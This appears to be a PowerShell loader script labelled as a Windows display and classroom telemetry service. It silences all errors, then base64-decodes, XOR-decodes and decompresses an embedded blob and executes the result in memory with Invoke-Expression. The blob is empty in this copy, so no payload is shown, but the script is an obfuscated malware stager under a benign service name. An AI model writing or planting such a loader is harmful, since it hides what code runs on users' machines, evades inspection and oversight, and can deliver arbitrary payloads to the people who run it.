# Windows Display & Classroom Telemetry Service (Protected Binary Loader)
$ErrorActionPreference = "SilentlyContinue"
$Global:SG_SCRIPT_PATH = $MyInvocation.MyCommand.Path
$_d = [Convert]::FromBase64String("")
for ($_i = 0; $_i -lt $_d.Length; $_i++) { $_d[$_i] = $_d[$_i] -bxor 90 }
$_ms = New-Object System.IO.MemoryStream(,$_d)
$_df = New-Object System.IO.Compression.DeflateStream($_ms, [System.IO.Compression.CompressionMode]::Decompress)
$_sr = New-Object System.IO.StreamReader($_df, [System.Text.Encoding]::UTF8)
$_sc = $_sr.ReadToEnd()
$_sr.Close(); $_df.Close(); $_ms.Close()
Invoke-Expression $_sc
